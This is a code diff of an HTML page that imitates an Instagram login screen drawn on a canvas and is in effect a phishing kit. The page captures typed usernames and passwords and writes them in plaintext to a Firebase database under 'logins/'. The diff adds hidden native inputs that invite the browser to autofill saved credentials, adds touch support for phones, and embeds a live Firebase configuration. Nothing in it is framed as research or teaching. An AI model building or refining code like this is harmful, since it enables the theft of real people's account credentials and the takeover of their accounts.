@@ -7,75 +7,177 @@
       margin: 0;
       overflow: hidden;
       background: #000;
+      position: relative;
+      height: 100vh;
     }
     canvas {
       display: block;
       cursor: default;
-      outline: none; /* Remove focus outline if you want */
+      outline: none;
+      background: #000;
+    }
+    .hidden-input {
+      position: absolute;
+      background: #121212;
+      border: none;
+      color: white;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      padding: 5px;
+      box-sizing: border-box;
+      outline: none;
+      display: none;
+      border-radius: 4px;
+      caret-color: white;
+      z-index: 10;
     }
   </style>
-  <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 </head>
 <body>
   <canvas id="canvas" tabindex="0"></canvas>
+  
+  <input id="input1-native" class="hidden-input" autocomplete="username" />
+  <input id="input2-native" class="hidden-input" autocomplete="current-password" type="password" />
+  
   <script>
-    // Your Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyD7egBqAFOkrAt4vCqYvsI80yM_jnG3taQ",
       authDomain: "idek-c694e.firebaseapp.com",
       projectId: "idek-c694e",
-      storageBucket: "idek-c694e.firebasestorage.app",
+      storageBucket: "idek-c694e.appspot.com",
       messagingSenderId: "912436644523",
       appId: "1:912436644523:web:d2f434d5ec1cbde846c5ee"
     };
 
-    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const input1Native = document.getElementById('input1-native');
+    const input2Native = document.getElementById('input2-native');
+    
     let bgImg = new Image();
-    bgImg.src = 'insta_background.png'; // Your background image
+    bgImg.src = 'insta_background.png';
 
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    // Make canvas focusable and focus it on load and click
-    canvas.focus();
-    canvas.addEventListener('mousedown', () => {
-      canvas.focus();
-    });
+    let input1Box, input2Box, buttonBox;
 
     let input1 = '', input2 = '';
-    let activeInput = null;
-
-    // Input box coordinates (update to match your image)
-    const input1Box = { x: 785, y: 210, w: 270, h: 28 };
-    const input2Box = { x: 785, y: 255, w: 270, h: 28 };
-    const buttonBox = { x: 785, y: 305, w: 270, h: 28 };
-
-    // Slightly lighter background color for inputs
-    const inputBgColor = '#121212';
-
-    // For blinking cursor
+    let activeInput = null; 
+    let input1Clicked = false, input2Clicked = false;
     let showCursor = true;
-    setInterval(() => {
-      showCursor = !showCursor;
+
+    const BASE_WIDTH = 1920;
+    const BASE_HEIGHT = 1080;
+
+    function updateBoxes() {
+      const baseYOffset = 20; // original shift in pixels
+      const extraYOffsetPercent = 25 / BASE_HEIGHT; // 25px expressed as % of 1080p base height
+      const totalYOffset = baseYOffset + (extraYOffsetPercent * BASE_HEIGHT); // in pixels
+
+      input1Box = {
+        x: canvas.width * (785 / BASE_WIDTH),
+        y: canvas.height * ((210 + totalYOffset) / BASE_HEIGHT),
+        w: canvas.width * (270 / BASE_WIDTH),
+        h: canvas.height * (28 / BASE_HEIGHT)
+      };
+      input2Box = {
+        x: canvas.width * (785 / BASE_WIDTH),
+        y: canvas.height * ((255 + totalYOffset) / BASE_HEIGHT),
+        w: canvas.width * (270 / BASE_WIDTH),
+        h: canvas.height * (28 / BASE_HEIGHT)
+      };
+      buttonBox = {
+        x: canvas.width * (785 / BASE_WIDTH),
+        y: canvas.height * ((305 + totalYOffset) / BASE_HEIGHT),
+        w: canvas.width * (270 / BASE_WIDTH),
+        h: canvas.height * (28 / BASE_HEIGHT)
+      };
+    }
+
+    function positionNativeInputs() {
+      const rect = canvas.getBoundingClientRect();
+
+      input1Native.style.left = `${rect.left + input1Box.x * (rect.width / canvas.width)}px`;
+      input1Native.style.top = `${rect.top + input1Box.y * (rect.height / canvas.height)}px`;
+      input1Native.style.width = `${input1Box.w * (rect.width / canvas.width)}px`;
+      input1Native.style.height = `${input1Box.h * (rect.height / canvas.height)}px`;
+      input1Native.style.fontSize = `${Math.round(canvas.height * (16 / BASE_HEIGHT))}px`;
+
+      input2Native.style.left = `${rect.left + input2Box.x * (rect.width / canvas.width)}px`;
+      input2Native.style.top = `${rect.top + input2Box.y * (rect.height / canvas.height)}px`;
+      input2Native.style.width = `${input2Box.w * (rect.width / canvas.width)}px`;
+      input2Native.style.height = `${input2Box.h * (rect.height / canvas.height)}px`;
+      input2Native.style.fontSize = `${Math.round(canvas.height * (16 / BASE_HEIGHT))}px`;
+    }
+
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      updateBoxes();
+      positionNativeInputs();
       draw();
-    }, 500);
+    }
+
+    window.addEventListener('resize', resizeCanvas);
+
+    function hideNativeInputs() {
+      input1Native.style.display = 'none';
+      input2Native.style.display = 'none';
+    }
+
+    function showNativeInput(name) {
+      if (name === 'input1') {
+        input1Native.style.display = 'block';
+        input2Native.style.display = 'none';
+        input1Native.value = input1;
+        input1Native.focus();
+      } else if (name === 'input2') {
+        input2Native.style.display = 'block';
+        input1Native.style.display = 'none';
+        input2Native.value = input2;
+        input2Native.focus();
+      } else {
+        hideNativeInputs();
+      }
+    }
+
+    input1Native.addEventListener('input', e => {
+      input1 = e.target.value;
+      draw();
+    });
+
+    input2Native.addEventListener('input', e => {
+      input2 = e.target.value;
+      draw();
+    });
+
+    input1Native.addEventListener('blur', () => {
+      input1Clicked = false;
+      activeInput = null;
+      hideNativeInputs();
+      draw();
+    });
+
+    input2Native.addEventListener('blur', () => {
+      input2Clicked = false;
+      activeInput = null;
+      hideNativeInputs();
+      draw();
+    });
 
     function draw() {
       ctx.clearRect(0, 0, canvas.width, canvas.height);
       ctx.drawImage(bgImg, 0, 0, canvas.width, canvas.height);
 
-      ctx.font = '16px Arial';
+      const fontSize = Math.round(canvas.height * (16 / BASE_HEIGHT));
+      ctx.font = `${fontSize}px Arial`;
       ctx.textBaseline = 'top';
-      ctx.fillStyle = 'white';
 
-      // Draw input background if clicked or if input has text
+      const inputBgColor = '#121212';
+
       if (input1Clicked || input1 !== '') {
         ctx.fillStyle = inputBgColor;
         ctx.fillRect(input1Box.x, input1Box.y, input1Box.w, input1Box.h);
@@ -85,31 +187,36 @@
         ctx.fillRect(input2Box.x, input2Box.y, input2Box.w, input2Box.h);
       }
 
-      // Draw input text
       ctx.fillStyle = 'white';
-      ctx.fillText(input1, input1Box.x + 5, input1Box.y + 5);
-      ctx.fillText('*'.repeat(input2.length), input2Box.x + 5, input2Box.y + 5);
 
-      // Draw blinking cursor for active input
-      if (activeInput === 'input1' && showCursor) {
+      if (input1Native.style.display === 'none') {
+        ctx.fillText(input1, input1Box.x + 5, input1Box.y + 5);
+      }
+
+      if (input2Native.style.display === 'none') {
+        ctx.fillText('*'.repeat(input2.length), input2Box.x + 5, input2Box.y + 5);
+      }
+
+      if (activeInput === 'input1' && showCursor && input1Native.style.display === 'none') {
         const textWidth = ctx.measureText(input1).width;
-        ctx.fillRect(input1Box.x + 5 + textWidth, input1Box.y + 5, 2, 18);
+        ctx.fillRect(input1Box.x + 5 + textWidth, input1Box.y + 5, 2, fontSize);
       }
-      if (activeInput === 'input2' && showCursor) {
+      if (activeInput === 'input2' && showCursor && input2Native.style.display === 'none') {
         const starsWidth = ctx.measureText('*'.repeat(input2.length)).width;
-        ctx.fillRect(input2Box.x + 5 + starsWidth, input2Box.y + 5, 2, 18);
+        ctx.fillRect(input2Box.x + 5 + starsWidth, input2Box.y + 5, 2, fontSize);
       }
-      // No visible login button drawn here (invisible but clickable)
     }
 
-    bgImg.onload = draw;
+    bgImg.onload = () => {
+      resizeCanvas();
+      draw();
+    };
 
-    // Save login info to Firebase then redirect to Instagram
     function saveToFirebase(username, password) {
       const timestamp = Date.now();
       return database.ref('logins/' + timestamp).set({
-        username: username,
-        password: password,
+        username,
+        password,
         time: new Date(timestamp).toLocaleString()
       })
       .then(() => {
@@ -117,47 +224,73 @@
       });
     }
 
-    // Track if inputs are clicked for drawing background
-    let input1Clicked = false;
-    let input2Clicked = false;
-
-    canvas.addEventListener('mousedown', e => {
+    function getEventPos(e) {
       const rect = canvas.getBoundingClientRect();
-      const scaleX = canvas.width / rect.width;
-      const scaleY = canvas.height / rect.height;
-      const x = (e.clientX - rect.left) * scaleX;
-      const y = (e.clientY - rect.top) * scaleY;
+
+      let clientX, clientY;
+
+      if (e.touches && e.touches.length > 0) {
+        clientX = e.touches[0].clientX;
+        clientY = e.touches[0].clientY;
+      } else {
+        clientX = e.clientX;
+        clientY = e.clientY;
+      }
+
+      const x = (clientX - rect.left) * (canvas.width / rect.width);
+      const y = (clientY - rect.top) * (canvas.height / rect.height);
+      return { x, y };
+    }
+
+    function handlePointerDown(e) {
+      e.preventDefault();
+      const { x, y } = getEventPos(e);
+
+      if (activeInput && !(
+        (x > input1Box.x && x < input1Box.x + input1Box.w && y > input1Box.y && y < input1Box.y + input1Box.h) ||
+        (x > input2Box.x && x < input2Box.x + input2Box.w && y > input2Box.y && y < input2Box.y + input2Box.h)
+      )) {
+        hideNativeInputs();
+        activeInput = null;
+        input1Clicked = false;
+        input2Clicked = false;
+        draw();
+        return;
+      }
 
       if (x > input1Box.x && x < input1Box.x + input1Box.w && y > input1Box.y && y < input1Box.y + input1Box.h) {
         activeInput = 'input1';
         input1Clicked = true;
         input2Clicked = false;
+        showNativeInput('input1');
         canvas.style.cursor = 'text';
       } else if (x > input2Box.x && x < input2Box.x + input2Box.w && y > input2Box.y && y < input2Box.y + input2Box.h) {
         activeInput = 'input2';
         input2Clicked = true;
         input1Clicked = false;
+        showNativeInput('input2');
         canvas.style.cursor = 'text';
       } else if (x > buttonBox.x && x < buttonBox.x + buttonBox.w && y > buttonBox.y && y < buttonBox.y + buttonBox.h) {
-        saveToFirebase(input1, input2).catch(error => {
-          alert('Error saving data: ' + error);
-        });
+        hideNativeInputs();
+        activeInput = null;
+        input1Clicked = false;
+        input2Clicked = false;
+        saveToFirebase(input1, input2).catch(error => alert('Error saving data: ' + error));
       } else {
         activeInput = null;
         input1Clicked = false;
         input2Clicked = false;
+        hideNativeInputs();
         canvas.style.cursor = 'default';
+        draw();
       }
-      draw();
-    });
+    }
+
+    canvas.addEventListener('mousedown', handlePointerDown);
+    canvas.addEventListener('touchstart', handlePointerDown, { passive: false });
 
     canvas.addEventListener('mousemove', e => {
-      const rect = canvas.getBoundingClientRect();
-      const scaleX = canvas.width / rect.width;
-      const scaleY = canvas.height / rect.height;
-      const x = (e.clientX - rect.left) * scaleX;
-      const y = (e.clientY - rect.top) * scaleY;
-
+      const { x, y } = getEventPos(e);
       if (
         (x > input1Box.x && x < input1Box.x + input1Box.w && y > input1Box.y && y < input1Box.y + input1Box.h) ||
         (x > input2Box.x && x < input2Box.x + input2Box.w && y > input2Box.y && y < input2Box.y + input2Box.h)
@@ -171,27 +304,18 @@
     });
 
     window.addEventListener('keydown', e => {
-      if (e.key === 'Tab') {
-        e.preventDefault(); // prevent browser tab behavior
+      if (input1Native.style.display !== 'none' || input2Native.style.display !== 'none') return;
 
+      if (e.key === 'Tab') {
+        e.preventDefault();
         if (activeInput === null) {
-          activeInput = 'input1';
-          input1Clicked = true;
-          input2Clicked = false;
+          activeInput = 'input1'; input1Clicked = true; input2Clicked = false;
         } else if (activeInput === 'input1') {
-          activeInput = 'input2';
-          input1Clicked = false;
-          input2Clicked = true;
+          activeInput = 'input2'; input1Clicked = false; input2Clicked = true;
         } else if (activeInput === 'input2') {
-          activeInput = 'button';
-          input1Clicked = false;
-          input2Clicked = false;
-          canvas.style.cursor = 'pointer';
+          activeInput = 'button'; input1Clicked = false; input2Clicked = false; canvas.style.cursor = 'pointer';
         } else if (activeInput === 'button') {
-          activeInput = 'input1';
-          input1Clicked = true;
-          input2Clicked = false;
-          canvas.style.cursor = 'text';
+          activeInput = 'input1'; input1Clicked = true; input2Clicked = false; canvas.style.cursor = 'text';
         }
         draw();
       } else if (e.key === 'Backspace') {
@@ -200,12 +324,7 @@
         draw();
       } else if (e.key === 'Enter') {
         if (activeInput === 'button' || activeInput === null) {
-          saveToFirebase(input1, input2).catch(error => {
-            alert('Error saving data: ' + error);
-          });
-        } else {
-          // Do nothing or move focus? Could submit if you want
-          // Or move focus to button?
+          saveToFirebase(input1, input2).catch(error => alert('Error saving data: ' + error));
         }
       } else if (e.key.length === 1) {
         if (activeInput === 'input1') input1 += e.key;
@@ -213,6 +332,15 @@
         draw();
       }
     });
+
+    setInterval(() => {
+      showCursor = !showCursor;
+      if (input1Native.style.display === 'none' && input2Native.style.display === 'none') {
+        draw();
+      }
+    }, 500);
+
+    canvas.focus();
   </script>
 </body>
 </html>
